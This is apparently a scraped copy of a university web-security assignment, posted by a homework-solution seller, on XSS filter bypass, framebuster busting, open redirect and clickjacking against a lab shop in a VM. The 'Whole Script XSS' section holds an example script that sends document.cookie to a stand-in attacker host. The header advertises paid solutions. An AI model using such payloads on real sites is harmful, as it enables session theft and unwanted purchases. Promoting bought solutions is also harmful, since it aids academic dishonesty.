# cscs6262-project-2--advanced-web-security-solved
**TO GET THIS SOLUTION VISIT:** [CSCS6262-Project 2- Advanced Web Security Solved](https://www.ankitcodinghub.com/product/cscs6262-project-%e2%80%8b2%e2%80%8b-advanced-web-security-solved/)


---

📩 **If you need this solution or have special requests:** **Email:** ankitcoding@gmail.com  
📱 **WhatsApp:** +1 419 877 7882  
📄 **Get a quote instantly using this form:** [Ask Homework Questions](https://www.ankitcodinghub.com/services/ask-homework-questions/)

*We deliver fast, professional, and affordable academic help.*

---

<h2>Description</h2>



<div class="kk-star-ratings kksr-auto kksr-align-center kksr-valign-top" data-payload="{&quot;align&quot;:&quot;center&quot;,&quot;id&quot;:&quot;74581&quot;,&quot;slug&quot;:&quot;default&quot;,&quot;valign&quot;:&quot;top&quot;,&quot;ignore&quot;:&quot;&quot;,&quot;reference&quot;:&quot;auto&quot;,&quot;class&quot;:&quot;&quot;,&quot;count&quot;:&quot;1&quot;,&quot;legendonly&quot;:&quot;&quot;,&quot;readonly&quot;:&quot;&quot;,&quot;score&quot;:&quot;5&quot;,&quot;starsonly&quot;:&quot;&quot;,&quot;best&quot;:&quot;5&quot;,&quot;gap&quot;:&quot;4&quot;,&quot;greet&quot;:&quot;Rate this product&quot;,&quot;legend&quot;:&quot;5\/5 - (1 vote)&quot;,&quot;size&quot;:&quot;24&quot;,&quot;title&quot;:&quot;CSCS6262-Project ​2​- Advanced Web Security Solved&quot;,&quot;width&quot;:&quot;138&quot;,&quot;_legend&quot;:&quot;{score}\/{best} - ({count} {votes})&quot;,&quot;font_factor&quot;:&quot;1.25&quot;}">

<div class="kksr-stars">

<div class="kksr-stars-inactive">
            <div class="kksr-star" data-star="1" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" data-star="2" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" data-star="3" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" data-star="4" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" data-star="5" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
    </div>

<div class="kksr-stars-active" style="width: 138px;">
            <div class="kksr-star" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
            <div class="kksr-star" style="padding-right: 4px">


<div class="kksr-icon" style="width: 24px; height: 24px;"></div>
        </div>
    </div>
</div>


<div class="kksr-legend" style="font-size: 19.2px;">
            5/5 - (1 vote)    </div>
    </div>
&nbsp;

<h4><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.ankitcodinghub.com/product/cs6262-project-2-advanced-web-security-fall2024-solved/">FALL2024 Solution VIEW</a></strong></span></h4>
<strong>All work needs to be done inside the VM. </strong>

<ol>
<li>Part 1 (50 Points)
<ol>
<li>Understand well known vulnerabilities such as cross-site scripting (XSS) and bypass regex detectors with your own XSS. (30 Points)</li>
<li>Understand and implement framebusting using the same extension to prevent malicious web page forgery and framing via iframes. (20 Points)</li>
</ol>
</li>
<li>Part 2 (50 Points)
<ol>
<li>Exploit a vulnerable website utilizing Open Redirect. (10 Points)</li>
<li>Exploit a vulnerable website called GTShop by utilizing clickjacking. (40 Points)</li>
</ol>
</li>
</ol>
<h1></h1>
Please refer to the Canvas assignment. ​<strong>The autograder for Part 1 will close 1 week before Part 2, to ensure you have enough time to complete Part 2, so start early if you want to leverage the autograder! </strong>

<h2><strong>Useful Suggestions </strong></h2>
Special thanks to ​<u>Joves Luo</u>​ for compiling this list of helpful tips. You should refer to them as you proceed through the project.

<h3>General</h3>
<ul>
<li>Use the console or developer tools to view Javascript errors.</li>
<li>Use console.log(“message”) or alert(“message”) to debug.</li>
<li>Most errors you encounter are likely very common and specific error messages are most likely solved via Googling.</li>
<li>View web page’s source code. Pay attention to hidden inputs. “Security by obscurity is a hacker’s best friend.”</li>
</ul>
<h3>Part 1.1: XSS</h3>
<ul>
<li>There are 3 regex patterns that you have to bypass. You will have to come up with 3 different whole script XSS attacks.</li>
<li>HTML has some very interesting syntax rules so you should refresh yourselves on what constitutes valid HTML.</li>
<li>The following link may be useful in crafting your attacks.</li>
</ul>
<a href="https://www.w3schools.com/Tags/tag_script.asp">https://www.w3schools.com/Tags/tag_script.asp</a>

<ul>
<li>Remember: you can make your attacks as crazy looking as you want them to be. As long as your attacks are composed of valid html and script, you can pass the regex and get the points.</li>
<li>Try to make a small change first. An extra character in certain places can completely bypass some regex detectors.</li>
</ul>
&nbsp;

This part is foreshadowing other parts of the project.&nbsp; You learn how to bypass XSS.&nbsp; What is XSS and Why is it blocked?&nbsp; What can it do if left unchecked?&nbsp; Keep these in mind.

&nbsp;

<h3>Part 1.2: Framebusting</h3>
<ul>
<li>Script inside the frame contains DEFENSIVE code. It prevents index.html from holding the iframe. Your job is to prevent the script from running.</li>
<li>You may find a way to run code before the script in the iframe runs, then block, replace or remove it in some way.</li>
<li><a href="https://developer.chrome.com/extensions/content_scripts">Content Scripts</a> allow you to run your javascript inside a website you are visiting via an​</li>
</ul>
It has some caveats but it is a possible approach to the problem.

<ul>
<li>Background scripts running in background enable you to INTERCEPT and MODIFY http requests. It also has some caveats but it is a feasible solution to the problem. <a href="https://crypto.stanford.edu/~dabo/pubs/papers/framebust.pdf">This paper</a> provides you useful information on framebusting​</li>
</ul>
&nbsp;

<h3>Part 2.1: Open Redirect</h3>
<ul>
<li>This is NOT a coding exercise. You compose a URL that redirects a user to the GT admission page when s/he logs in.</li>
<li>You can learn rudiments of URL in <a href="https://www.ibm.com/support/knowledgecenter/en/SSGMCP_5.3.0/com.ibm.cics.ts.internet.doc/topics/dfhtl_uricomp.html">this lin</a><u>​ </u><a href="https://www.ibm.com/support/knowledgecenter/en/SSGMCP_5.3.0/com.ibm.cics.ts.internet.doc/topics/dfhtl_uricomp.html">k</a><a href="https://www.ibm.com/support/knowledgecenter/en/SSGMCP_5.3.0/com.ibm.cics.ts.internet.doc/topics/dfhtl_uricomp.html">.</a><u>​</u></li>
<li>Write a URL that results in the redirect. Copy and paste it into redirect.txt. No code required.</li>
</ul>
&nbsp;

<h3>Part 2.2: Clickjacking</h3>
<ol>
<li>Get an iframe to run code it shouldn’t. Think back to the part 1, how did we get a victim to run unintended code? For the web, what vulnerability makes this happen? Remind your experience from CS6035, Intro to Information Security.</li>
<li>Get information about the iframe. How can we get data from another domain?&nbsp; Review related lectures.</li>
<li>How do we pass data back and forth? Take what you figured out in step 2, mirror it to get two way communication.</li>
<li>With the data, what does the parent window need to do with the info?</li>
<li>The buy action is subject to SOP. How do you get around it?</li>
<li>Once you figure out how to get around the SOP, what needs to be executed to buy something?
<ol>
<li>When you buy something, you need a correct ID only. Don’t worry about product names, addresses, mails, etc.</li>
<li>If you get a success response but nothing is actually purchased, that is because the server code swallows exceptions.</li>
<li>You need only one iframe.</li>
<li>You don’t need to bother with the tester leaving the search results page.</li>
<li>Each query will be with a fresh search from your page.</li>
</ol>
</li>
</ol>
&nbsp;

<strong>You will submit 5 files to Canvas for grading: </strong>

For the part 1 tasks, you can only zip these 3 files and upload to gradescope for testing your solution.

But <strong>please submit all the 5 files to Canvas before the whole project dues.</strong>​

Part 1

<ul>
<li><strong>json </strong></li>
<li><strong>txt </strong></li>
<li><strong>js </strong></li>
</ul>
Part 2

<ul>
<li><strong>txt </strong></li>
<li><strong>html </strong></li>
</ul>
<h2><strong>Project Setup </strong></h2>
<h3>Virtual Machine (CS6262 P2 Spring 2021.ova)</h3>
<strong>&nbsp;</strong>

<strong>All tasks need to be done inside the VM. </strong>

<strong>&nbsp;</strong>

Download a VM via the following link:

&nbsp;

<ul>
<li>Mirror #1: ​<a href="https://drive.google.com/file/d/1pOXiaejAWoMcKEXlaILmgVyYPicknhPM/view?usp=sharing">Link to OVA</a><u>​</u> on Google Drive</li>
<li>Mirror #2: <a href="https://gtvault-my.sharepoint.com/:u:/g/personal/zyang455_gatech_edu/EbgzsTsXQ5lNvnQaNq698toBMIfJXTjYMluJ7r_NCUtijA?e=p8Ouch">Link to OVA</a>​ on OneDrive​</li>
</ul>
&nbsp;

<strong>md5: 85d82922198afa2c03255dcda634774b </strong>

&nbsp;

Import the OVA file into the latest version of ​<a href="https://www.virtualbox.org/wiki/Downloads">VirtualBox</a><u>​</u><a href="https://www.virtualbox.org/wiki/Downloads">.</a> The VM may take a while to boot.

&nbsp;

The credentials are:

<strong>&nbsp;</strong>

<table width="129">
<tbody>
<tr>
<td width="129">•&nbsp;&nbsp;&nbsp; Username: ​<strong>user</strong></td>
</tr>
<tr>
<td width="129">•&nbsp;&nbsp;&nbsp;&nbsp; Password: <strong>user</strong></td>
</tr>
</tbody>
</table>
​

If you find the VM booting quite slowly, please do the following check after it first boots up. Run “​sudo blkid​” and copy the UUID of the line which contains TYPE=”swap”.

&nbsp;

Then, run “​sudo vim /etc/fstab​” and update the entry of UUID of the “swap” line.

&nbsp;

After updating it, input “​:wq​” to save and exit. Now you can reboot the VM. It should boot much faster.

&nbsp;

We do <strong>NOT</strong>​&nbsp;&nbsp;&nbsp; recommend you to update any existing packages via package managers (e.g., apt-get) or​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; the update dialog shown below:

&nbsp;

&nbsp;

&nbsp;

In the case where you accidentally update packages and experience any malfunction, you may want to repeat the VM install with a fresh copy. Although there is no restriction for you to install any necessary packages (e.g., your favorite editors), you should do that at your own risk.

&nbsp;

<h3>Part 1 XSS and Framebuster files (part1.zip)</h3>
Download and unzip Part 1 skeleton files:

<ul>
<li>Mirror #1: <a href="https://drive.google.com/open?id=1L7KqG3Yr2N9Q159zgVL6VgVAQEWQ5x7s">https://drive.google.com/open?id=1L7KqG3Yr2N9Q159zgVL6VgVAQEWQ5x7</a>​ <a href="https://drive.google.com/open?id=1L7KqG3Yr2N9Q159zgVL6VgVAQEWQ5x7s">s</a></li>
<li>Mirror #2: <a href="https://drive.google.com/file/d/121Re9RL4XTbNZ5lT-F3skL7qn_i-0kOU">https://drive.google.com/file/d/121Re9RL4XTbNZ5lT-F3skL7qn_i-0kO</a>​ <a href="https://drive.google.com/file/d/121Re9RL4XTbNZ5lT-F3skL7qn_i-0kOU">U</a> <strong>md5: 815ad2933f951c13516caabb3ec0315b </strong></li>
</ul>
<strong>&nbsp;</strong>

Your part 1 should have the following files:

&nbsp;

&nbsp;

&nbsp;

Your demo-color-changer-chrome-extension folder should have:

&nbsp;

&nbsp;

&nbsp;

<h3>Part 2 Open Redirect and Clickjacking Files (part2.zip)</h3>
Download and unzip Part 2 skeleton files:

<ul>
<li>Mirror #1: ​<a href="https://drive.google.com/file/d/1EiLjDcSVN2TQe2R97zcx-QK2bxEvoD_O">https://drive.google.com/file/d/1EiLjDcSVN2TQe2R97zcx-QK2bxEvoD_O</a></li>
<li>Mirror #2: ​<a href="https://drive.google.com/file/d/1cSocsrSyyJH3bYGUnpw82Yr6KuGDqask/">https://drive.google.com/file/d/1cSocsrSyyJH3bYGUnpw82Yr6KuGDqask/</a></li>
</ul>
&nbsp;

<strong>md5: ae9f8b51b9806359fae14cd8c73259a4</strong>

&nbsp;

&nbsp;

&nbsp;

<strong>Project Tasks (</strong><strong>100</strong>​ <strong> points):</strong>​ <strong>&nbsp; </strong>

<strong>&nbsp;&nbsp; </strong><strong>Part 1: XSS and Framebusting (</strong>​ <strong>50</strong>​ <strong> points)</strong>​

<h2>&nbsp;&nbsp;&nbsp;&nbsp; <strong>Part 1.1: XSS Attack – (</strong><strong>30</strong>​ <strong> points)</strong>​</h2>
&nbsp;

<h3>Overview</h3>
This part aims to help you understand how you can spoof regex detectors with a maliciously crafted text string. Although it may seem to be a tempting solution, detecting XSS attacks with regex is a bad idea in reality. We want you to experience this by conducting XSS attacks with your own scripts and bypassing the vulnerable XSS defender. To this end, ​<strong>we have set up a server which is accessible inside the VM ONLY</strong>​:

&nbsp;

<a href="http://cs6262.gtisc.gatech.edu/xss/index.html">http://cs6262.gtisc.gatech.edu/</a>

&nbsp;

By copying this URL into the browser inside the VM, you are able to see two links for the two tasks in Part 1.

&nbsp;

&nbsp;

&nbsp;

The XSS link will bring you to a website containing 3 input fields. Each input will be examined by three different regex patterns. <strong>Your job is to compose 3 different XSS attacks which are able</strong>​&nbsp; <strong> to bypass those 3 regex patterns.</strong> ​ <strong>Be careful that your attacks should be EXECUTABLE</strong>​&nbsp;&nbsp;&nbsp; <strong> html code in web browsers. </strong>You can copy your code into the HTML panel on&nbsp; ​ <a href="https://jsfiddle.net/">https://jsfiddle.net</a><u>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </u><a href="https://jsfiddle.net/">/</a> and run it to see if it can execute.

&nbsp;

<strong><u>IMPORTANT</u></strong>:​

<h4>1. YOUR CODE MUST BE EXECUTABLE FOR FULL CREDIT. IF YOUR CODE PASSES</h4>
OUR REGEX FILTER BUT DOES NOT EXECUTE, YOU WILL NOT RECEIVE FULL

CREDIT. (You will receive partial credit if your XSS passes the filter but DOES NOT execute. However, you won’t receive any credit in the other case (i.e., executable but failed to pass the filter)

<ol start="2">
<li>FOR GRADING PURPOSES, YOU <strong>MUST INSERT ALERT IN YOUR XSS ATTACK</strong>​ PAYLOAD.</li>
</ol>
&nbsp;

Alert is a built-in javascript function for a pop-up message. You can use it as follows:

&lt;script&gt;alert(“wazzzzaaaup”);&lt;/script&gt;

&nbsp;

You are responsible for ensuring your XSS attacks are valid HTML so that the alert should be properly interpreted and run by the web browser. Getting the SUCCESS response means your XSS attack bypassed our regex filter, but it <strong>does NOT necessarily imply that your script is</strong>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong> executable. </strong>Again, ensure you place your XSS attack in an HTML page (or jsfiddle) and run it, to​ ensure an alert is generated (meaning it executes).

&nbsp;

On a successful attack, the web page would return results like the following. Each image shows the success and fail results respectively.

&nbsp;

&nbsp;

&nbsp;

<h3>Resources</h3>
<em>Tutorial Document </em>

The following document gives you an in-depth introduction to XSS.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://docs.google.com/document/d/1F7_axXzKVdqegWQDX6HmlwNchhsaLchWieOagWVzghE">https://docs.google.com/document/d/1F7_axXzKVdqegWQDX6HmlwNchhsaLchWieOagWVzgh</a>​ <a href="https://docs.google.com/document/d/1F7_axXzKVdqegWQDX6HmlwNchhsaLchWieOagWVzghE">E</a>

&nbsp;

<em>Additional Resources </em>

You can learn the foundations of XSS and RegEx in following links:

About XSS:

<a href="https://en.wikipedia.org/wiki/Cross-site_scripting">https://en.wikipedia.org/wiki/Cross-site_scripting</a> <a href="https://gbhackers.com/xss-cross-site-scripting/">https://gbhackers.com/xss-cross-site-scripting/</a>

&nbsp;

About REGEX:

<a href="https://en.wikipedia.org/wiki/Regular_expression">https://en.wikipedia.org/wiki/Regular_expression</a> <a href="https://www.computerhope.com/jargon/r/regex.htm">https://www.computerhope.com/jargon/r/regex.htm</a> The sample_xss_attacks.txt shows some XSS samples.

<em>Whole Script XSS</em>

A whole script attack consists of opening and closing script tags that embeds JavaScript statements in-between. Attackers inject the malicious code into the victim’s page in order to exfiltrate the sandbox (e.g., Same Origin Policy) of web browsers. For example,

&nbsp;

&lt;script&gt;

document.location=​&nbsp; “http://attacker.com/saveCookie.php?cookie=”​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +​ document&nbsp;&nbsp;&nbsp;&nbsp; ​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ​.cookie; &lt;/script&gt;

&nbsp;

For more details, please read this paper:

<a href="http://seclab.cs.sunysb.edu/seclab/pubs/xss.pdf">Protection, Usability and Improvements in Reflected XSS Filters</a>

<h2>&nbsp;&nbsp;&nbsp;&nbsp; <strong>Part 1.2: Browser Extension Framebuster – (</strong><strong>20</strong>​ <strong> points)</strong>​</h2>
<h3>Background: Frame Busting</h3>
An iframe is a HTML tag that embeds another HTML document in the current web page. The origin of the embedding HTML document could be different to the one of the host webpage that a user is visiting.

&nbsp;

Frame-busting is a technique that protects clients from clickjacking. It prevents web pages from being rendered inside a frame.

&nbsp;

One method to block client-side clickjacking is to place the following JavaScript snippet in each web page:

&nbsp;

&lt;script&gt;

<strong>if</strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (top != self) top.location.href = location.href;​ &lt;/script&gt;

&nbsp;

<h3>Overview</h3>
You will create a Google Chrome Extension to:

<ul>
<li>Bypass the frame busting technique used in the <u>sample website</u>​</li>
</ul>
&nbsp;

<h4>Sample Website with Frame Buster</h4>
http://cs6262.gtisc.gatech.edu/framebusting/

&nbsp;

<strong>You can only access this site inside the VM. </strong>

&nbsp;

<ul>
<li>Under the frame directory, there are two pages:</li>
<li>frame-busting-page.html</li>
<li>html</li>
<li>Your extension (which contains <em>js</em>​ ​) should bypass the frame busting technique and frame the frame-busting-page.html page into the index.html’s (under frame directory) iframe.</li>
</ul>
<h4>Example of Successful Frame Buster Buster</h4>
&nbsp;

&nbsp;

<h3>Resources</h3>
<em>Quick Start</em>

You can find the Chrome extension quickstart guide in&nbsp; ​<strong><em>Canvas -&gt; Files -&gt; Guides and Tutorials</em></strong>​. This will be helpful if you don’t have experience with Chrome Extensions.

&nbsp;

<em>Chrome Extension </em>

If you are unfamiliar with browser extension development, check out a demo extension in the <strong>demo-color-changer-chrome-extension</strong>​ folder.

&nbsp;

The most important component of a Chrome browser extension is the ​<em>manifest.json</em>​ file. It looks like:

{

“name”: ​”CS6262 Extension”​,

“description”: ​”A simple extension”​,

“version”: ​”1.0″​,

“permissions”: [

​”tabs”​,

​”notifications”

],

“background”: {

“scripts”: [​”frame_buster.js”​],

“persistent”: ​false

},

“browser_action”: {

“default_title”: ​”Does something”​,

“default_icon”: ​”icon.png”

},

“manifest_version”: 2​

}

&nbsp;

The JSON file shows various keys like <strong>browser_action</strong>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; , ​ <strong>permissions</strong>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; , and ​&nbsp;&nbsp; <strong>background</strong>​&nbsp;&nbsp; . You use​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; them to complete this part of the project. For further information about the typical Chrome extension structure, refer to this link:

<a href="https://developer.chrome.com/extensions/getstarted">https://developer.chrome.com/extensions/getstarted</a>

&nbsp;

Note: <strong>The manifest.json file should only reference your frame_buster.js file. If you leave</strong>​&nbsp; <strong> references to other files like icon.png, your manifest.json will error out and you will not receive points. </strong>

&nbsp;

For further reading, refer to <a href="https://developer.chrome.com/extensions/webRequest">https://developer.chrome.com/extensions/webReques</a><u>​ </u><a href="https://developer.chrome.com/extensions/webRequest">t</a>

&nbsp;

<h2><strong>Part 1 Grading </strong></h2>
&nbsp;

<h3>Part 1.1 XSS Requirements</h3>
<ul>
<li>You may not use the same XSS attack on multiple inputs. <strong>Each attack must be unique!</strong>​ <strong> Each pair of similar attacks will result in a 2-point penalty. </strong></li>
<li>Hard coded ‘Success’ is prohibited and will result in a 0.</li>
<li>Your three answers should <strong>be placed on three separate lines in xss_attacks.txt</strong>​</li>
<li>No external libraries are allowed.</li>
<li>Code must be executable.</li>
</ul>
&nbsp;

<h3>Part 1.2 Frame Busting Requirements</h3>
<ul>
<li>Do not use the “sandboxing attribute” of the browser to bypass the frame buster. Doing so will result in zero credit.</li>
<li>Your extension must not pop up any kind of alerts which requires user interaction.</li>
<li>You may use automatic notifications but no JavaScript alerts.</li>
<li>Pop-ups that require user interaction will result in zero credit.</li>
<li>Please make sure the page can be loaded within 3 seconds, otherwise it will result in zero credit.</li>
<li>Do NOT hardcode any URLs in your source code. Your extension should work for ANY website if the same vulnerability is present. Otherwise, a 10 point penalty will be applied to your project grade.</li>
<li>Your extension must work for the original Google Chrome in the given VM. We will not grade your extension outside the VM nor with other versions of Google Chrome in any different environment.</li>
<li>Your extension must not modify the appearance of the framed page. It should look exactly the same, <strong>pixel-by-pixel</strong>​ . Otherwise, a ​&nbsp;&nbsp;&nbsp;&nbsp; <strong>10</strong>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <strong> point penalty</strong> will be applied to your project​</li>
<li>Remove all references to files other than frame_buster.js from your manifest.json. You should not reference any other file like icon.png etc. Referencing files other than frame_buster.js may result in a 0 for this portion.</li>
<li>No external libraries are allowed.</li>
</ul>
<h3>Deliverables</h3>
<ul>
<li><strong>json </strong></li>
<li><strong>txt </strong></li>
<li><strong>js </strong></li>
</ul>
&nbsp;

<h3>Autograder</h3>
GradeScope has an autograder setup to test your submissions. For the XSS task, it has the same XSS filters as what are used by the XSS website. For the framebusting task, it primarily tests the functionality of your extension which is to prevent the page from going to <em>frame-busting-page.html</em>​.

The autograder will close <strong>on February 19th.</strong>​

<strong><em>&nbsp;</em></strong>

<h3>Rubric</h3>
<table width="563">
<tbody>
<tr>
<td width="78"><strong>Points </strong></td>
<td width="485"><strong>Milestone </strong></td>
</tr>
<tr>
<td width="78"><strong>20 </strong></td>
<td width="485">Successfully bust the frame buster. We will try ​<strong>20</strong>​ ​<strong>times</strong>​ and award 1 point per successful result.</td>
</tr>
<tr>
<td width="78"><strong>5 </strong></td>
<td width="485">XSS first input passes regex filter</td>
</tr>
<tr>
<td width="78"><strong>5 </strong></td>
<td width="485">XSS first input is executable html</td>
</tr>
<tr>
<td width="78"><strong>5 </strong></td>
<td width="485">XSS second input passes regex filter</td>
</tr>
<tr>
<td width="78"><strong>5 </strong></td>
<td width="485">XSS second input is executable html</td>
</tr>
<tr>
<td width="78"><strong>5 </strong></td>
<td width="485">XSS third input passes regex filter</td>
</tr>
<tr>
<td width="78"><strong>5 </strong></td>
<td width="485">XSS third input is executable html</td>
</tr>
<tr>
<td width="78"><strong>-2 </strong></td>
<td width="485">For each pair of XSS attacks whose similarity ratio of two attacks is greater than&nbsp; 90%. ​<strong> Submitting similar XSS attacks will result in at most a 6-point penalty.&nbsp; </strong>​It’s measured by JavaScript library below

`​stringSimilarity.​compareTwoStrings​(a, b)
</td>
</tr>
</tbody>
</table>
<strong>Part 2: GTShop Vulnerabilities – (</strong>​<strong>50</strong>​<strong> points) </strong>

<h3>Overview</h3>
The objective of this part is to help you understand some vulnerabilities that can be exploited in websites in a practical fashion.

&nbsp;

You will be exploiting open redirect and clickjacking vulnerabilities. This portion of the project is broken into two parts: <strong>Open Redirect</strong>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and ​&nbsp;&nbsp;&nbsp; <strong>Clickjacking</strong>​&nbsp;&nbsp; .​

Inside the VM, open Firefox by clicking on the browser icon located near the Start Menu. The browser should automatically bring you to the GTShop web page. If not, navigate to http://www.gtshop.com/. You should see an online store that allows you to buy products.

&nbsp;

&nbsp;

&nbsp;

<strong>Note</strong>​: This shop is only accessible within the VM. Accessing the URL outside of the VM will bring you to a different website.

&nbsp;

<table width="574">
<tbody>
<tr>
<td colspan="2" width="574">The GTShop has several vulnerabilities, which include susceptibility to open redirect and</td>
</tr>
<tr>
<td width="78">clickjacking.</td>
<td width="496"></td>
</tr>
</tbody>
</table>
<h1>Part 2.1: Open Redirect (​10​ points)</h1>
<h2>Overview</h2>
Open redirect is a session management related vulnerability that redirects the user to an unchecked domain or site. Generally, this vulnerability may be benign, but it can be used as a channel to deliver a browser exploit by redirecting users to a specifically crafted site.

Assumptions

<ul>
<li>The user is logged out of http://www.gtshop.com/.</li>
</ul>
<h2>Task</h2>
<strong>Provide a URL in redirect.txt that redirects the user to</strong>​ the ​<strong>Georgia Tech Mug</strong>​ after he or she logs into http://www.gtshop.com/. The URL should be on the first line of redirect.txt. All other lines will be ignored by the autograder.

&nbsp;

<strong><u>Caution:</u></strong> <u>​ </u>Giving a URL for a product page will not secure your full credits. We are expecting a​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; redirect attack, not a URL of a specific product page. ​<strong>To be specific, for the Georgia Tech </strong>

<strong>Coffee Mug, http://www.gtshop.com/products/detail?id=1 is NOT an expected answer. </strong>

&nbsp;

<h2>Example of Successful Open Redirect Exploit</h2>
&nbsp;

<h1>Part 2.2: Clickjacking (​40​ points)</h1>
<h2>Overview</h2>
Clickjacking is a spoofing attack that overlays a transparent iframe (or other DOM objects) over other visible web components such as buttons, images or links. When users click on the visible objects, they will be clicking on the iframe instead, which triggers an unintended behavior different to what the user expected. In this part, you will try clickjacking to lure users to purchase an item in GTShop while they don’t even perceive it.

&nbsp;

We have provided you with a skeleton file, ​<strong>clickjack.html</strong>​. It renders a dummy form that contains a text field for entering a query string and two buttons. The form does nothing out of the box.

&nbsp;

<strong>Your first task is</strong>​ to add functionalities to the dummy form. ​<strong>When the user types a string in the text field</strong>​ and ​<strong>clicks on</strong>​ the ​<strong>I’m Feeling Lucky</strong>​ button, s/he ​<strong>performs a product search on the </strong>

<strong>GTShop with that same query string</strong>​. This should bring search results of the product to the user.

&nbsp;

The search results page shows an ​<strong>Info</strong>​ link &nbsp;next to each product that was found. Clicking on the ​<strong>Info</strong>​ link &nbsp;brings you to the product details page.

&nbsp;

Your ​<strong>second task is to modify clickjack.html </strong>​such that ​<strong>when the user clicks on</strong>​ ​<strong>any</strong>​ of the <strong>Info</strong>​ links on the search results page, then ​<strong>s/he ends up purchasing the corresponding item</strong>​.

<strong><em>&nbsp;</em></strong>

<h2>Assumptions</h2>
<ul>
<li>The user is already logged into http://www.gtshop.com/.</li>
<li>You do not need to worry about the product Stalker Copter since it was sold out.</li>
<li>There is a known bug for GTShop website, “Finals Avoider” was sold out but not in the description, and cannot be purchased.</li>
<li>We will not add or remove products from the shop.</li>
<li>The query strings we test will return at least one product.</li>
<li>You only need to care about the product name and id being purchased.</li>
</ul>
&nbsp;

&nbsp;

Finally, to copy files onto the provided vm, you can use some type of file storage service such as onedrive or google drive.

&nbsp;

<h2>Instructions to position overlays</h2>
In order to learn where to put the overlay, one needs to understand how CSS works. <a href="https://www.w3schools.com/html/html_css.asp">https://www.w3schools.com/html/html_css.asp</a> provides a quick example of what CSS is and how​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; it can modify the HTML page. The ways of positioning the overlay can be found here <a href="https://www.w3schools.com/css/css_positioning.asp">https://www.w3schools.com/css/css_positioning.asp</a>.​

&nbsp;

Basically, you have two approaches to put the overlays.

<ul>
<li><strong>Put the overlays in your own malicious HTML</strong> which is the clickjack.html. This​ approach requires you to build a communication bridge between your malicious HTML and the real shopping site by exploiting the vulnerabilities of <a href="http://www.gtshop.com/">gtshop.co</a><u>​ </u><a href="http://www.gtshop.com/">m</a><a href="http://www.gtshop.com/">.</a><u>​</u> The API</li>
</ul>
you can use is window.postMessage. Here you can find more details,

<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage">https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage</a>. Since you need​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; to position the overlay in your own HTML which doesn’t have any anchors or parent nodes related to the info button, you need to know the position offsets of each info button, such that you can reproduce them in your own HTML. HTMLElement.offset* attributes will help you get this information. However, you need to be careful to handle the case when the user scrolls down or up. You also need to update the position of the overlays.

<ul>
<li><strong>Put the overlays in the vulnerable page</strong>. You need to leverage the vulnerability to put​ some overlay onto the info button. Since the workspace is on the page where the info buttons reside, you can rely on the positions of the info button or its parent to put your overlay. <a href="https://www.w3schools.com/css/css_positioning.asp">https://www.w3schools.com/css/css_positioning.as</a><u>​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </u><a href="https://www.w3schools.com/css/css_positioning.asp">p</a> will be extremely useful to​&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; learn how to place overlay given the info button element. One suggestion is that you can work in the “console” to craft your malicious JS in a normal product page, i.e. by searching “a” in the original website.</li>
</ul>
&nbsp;

<h2>Instruction to Make a Purchase</h2>
By pressing “F12”, you will enter developer mode. Please go to the “Network” tab and clear the log. Check “Preserve log” if you want. Now, you can go to buy a product and see what network request it will make. Mimic the network request when you do purchasing in your clickjacking task.

&nbsp;

&nbsp;

<h2>Example of Successful Clickjacking Exploit</h2>
User visits clickjack.html, enters a into the text field, and clicks on the <strong>I’m Feeling Lucky</strong>​ button.​

&nbsp;

&nbsp;

&nbsp;

The user is directed to the search results page for the chosen query. For the project, each info link should have a <strong>translucent</strong>​&nbsp; overlay looking like the following image.​

&nbsp;

&nbsp;

User clicks anywhere on ​<strong>one or more Info links</strong>​ on a given search results page.

&nbsp;

Visiting the ​<strong>My products</strong>​ link shows that the user purchased the corresponding product(s).

&nbsp;

<h2>Quick Start Guide</h2>
